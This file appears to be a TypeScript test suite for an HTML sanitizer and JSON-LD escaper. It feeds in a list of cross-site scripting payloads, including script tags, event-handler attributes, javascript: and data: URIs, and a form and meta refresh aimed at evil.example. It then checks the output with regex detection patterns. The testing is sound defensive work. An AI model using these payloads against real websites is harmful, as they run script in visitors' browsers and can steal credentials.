import { sanitizeRichText, sanitizeToText, jsonLdScript } from "../lib/sanitize";

const attacks: [string, string][] = [
  ["script tag", `<p>hi</p><script>alert(1)</script>`],
  ["img onerror", `<p>hi</p><img src=x onerror=alert(1)>`],
  ["svg onload", `<svg onload=alert(1)></svg>`],
  ["javascript href", `<a href="javascript:alert(1)">click</a>`],
  ["JaVaScRiPt href", `<a href="JaVaScRiPt:alert(1)">click</a>`],
  ["data uri", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`],
  ["iframe", `<iframe src="https://evil.example"></iframe>`],
  ["style tag", `<style>body{display:none}</style><p>ok</p>`],
  ["body onload", `<body onload=alert(1)><p>ok</p></body>`],
  ["form action", `<form action="https://evil.example"><input name="pw"></form>`],
  ["style expression", `<p style="width:expression(alert(1))">x</p>`],
  ["style url beacon", `<p style="background:url(https://evil.example/x)">x</p>`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`],
  ["object embed", `<object data="x"></object><embed src="y">`],
  ["nested script in attr", `<a href="x" onclick="alert(1)">y</a>`],
  ["uppercase script", `<SCRIPT>alert(1)</SCRIPT>`],
  ["malformed script", `<scr<script>ipt>alert(1)</script>`],
  ["noscript", `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`],
];

let failures = 0;
for (const [name, input] of attacks) {
  const out = sanitizeRichText(input);
  // Assert on the absence of anything *executable*, not on the absence of
  // inert text. `<scr<script>ipt>` legitimately leaves the text "ipt>alert(1)"
  // behind, which is harmless: no tag, no handler, nothing to run.
  const dangerous =
    /<\s*script|<\s*iframe|<\s*style|<\s*object|<\s*embed|<\s*form|<\s*meta|<\s*body|<\s*svg|<\s*img/i.test(out) ||
    /\son(error|load|click|focus|mouseover)\s*=/i.test(out) ||
    /javascript\s*:/i.test(out) ||
    /expression\s*\(/i.test(out) ||
    /url\s*\(/i.test(out) ||
    /http-equiv/i.test(out);
  const status = dangerous ? "FAIL" : "pass";
  if (dangerous) failures++;
  console.log(`${status}  ${name.padEnd(22)} -> ${out}`);
}

console.log("\n--- legitimate TipTap output must survive ---");
const legit = `<h2>Heading</h2><p>Some <strong>bold</strong> and <em>italic</em> text with a <a href="https://example.com" target="_blank" rel="noopener noreferrer">link</a>.</p><ul><li>one</li><li>two</li></ul><table><tbody><tr><th style="text-align: left">H</th><td colspan="2">C</td></tr></tbody></table><blockquote><p>quote</p></blockquote><pre><code>npm run dev</code></pre><p style="text-align: center">centred</p>`;
const clean = sanitizeRichText(legit);
for (const needed of ["<h2>", "<strong>", "<em>", 'href="https://example.com"', "<ul>", "<li>", "<table>", "<th", 'colspan="2"', "<blockquote>", "<code>", "text-align:center"]) {
  const present = clean.includes(needed);
  if (!present) failures++;
  console.log(`${present ? "pass" : "FAIL"}  keeps ${needed}`);
}

console.log("\n--- plain text + JSON-LD ---");
console.log("toText:", JSON.stringify(sanitizeToText("<p>Hello <b>world</b></p>  spaced")));
const injected = jsonLdScript({ headline: `Evil</script><img src=x onerror=alert(1)>` });
const closesEarly = /<\/script>/i.test(injected);
console.log(`${closesEarly ? "FAIL" : "pass"}  jsonLdScript escapes </script> -> ${injected}`);
if (closesEarly) failures++;
console.log(`${/\\u003c/.test(injected) ? "pass" : "FAIL"}  jsonLdScript escapes < as \\u003c`);

console.log(`\n${failures === 0 ? "ALL CHECKS PASSED" : `${failures} CHECK(S) FAILED`}`);
process.exit(failures === 0 ? 0 : 1);
